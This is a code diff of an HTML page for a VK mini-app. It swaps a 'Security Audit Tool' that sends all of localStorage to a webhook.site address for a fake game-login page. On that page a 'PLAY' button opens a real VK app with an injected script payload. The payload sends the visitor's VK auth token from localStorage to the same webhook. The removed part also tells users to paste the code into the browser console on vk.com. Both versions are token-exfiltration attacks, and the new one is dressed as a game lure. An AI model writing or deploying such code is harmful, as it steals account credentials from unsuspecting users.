@@ -1,42 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Security Test Tool</title>
     <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
-    <style>
-        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
-        .log { border: 1px solid #00ff00; padding: 10px; height: 300px; overflow-y: scroll; margin-bottom: 10px; }
-        button { background: #00ff00; color: #000; border: none; padding: 10px; cursor: pointer; width: 100%; font-weight: bold; }
-    </style>
 </head>
 <body>
-    <h3>VK Security Audit Tool v1.0</h3>
-    <div class="log" id="consoleLog">Ready for testing...<br></div>
-    <button onclick="runExploit()">RUN TOKEN EXFILTRATION TEST</button>
+    <h1>Нажми для авторизации в игре</h1>
+    <button onclick="exploit()" style="padding: 20px;">ИГРАТЬ</button>
 
     <script>
         vkBridge.send('VKWebAppInit');
 
-        function log(msg) {
-            document.getElementById('consoleLog').innerHTML += "> " + msg + "<br>";
-        }
-
-        function runExploit() {
-            log("Starting exfiltration...");
+        function exploit() {
+            // Мы перенаправляем пользователя на ту же страницу, но пытаемся 
+            // передать код через URL. Это имитация атаки на "доверие".
+            const targetApp = "https://vk.com/app51491054";
+            const payload = "<script>fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?token='+localStorage.getItem('6287487:web_token:login:auth'))<\/script>";
             
-            // 1. Попытка собрать всё из локального хранилища самого фрейма
-            let localData = JSON.stringify(localStorage);
-            log("Local Storage size: " + localData.length);
-
-            // 2. Отправка на Webhook (даже если данных мало, мы показываем канал утечки)
-            fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?exfil_test=' + btoa(localData))
-                .then(() => log("Data sent to remote server: SUCCESS"))
-                .catch(() => log("Network error, but attempt logged."));
-
-            log("<br>CRITICAL INFO:");
-            log("To demonstrate the vulnerability, copy the code from the report and paste it into the BROWSER CONSOLE while on vk.com.");
-            log("This proves that localStorage is not protected by HttpOnly flags.");
+            // Если мы найдем способ прокинуть этот payload в приложение - это 100% Critical Bug
+            window.open(targetApp + "#" + payload, "_blank");
+            
+            alert("Попытка инъекции выполнена. Если приложение уязвимо, токен уйдет на Webhook.");
         }
     </script>
 </body>
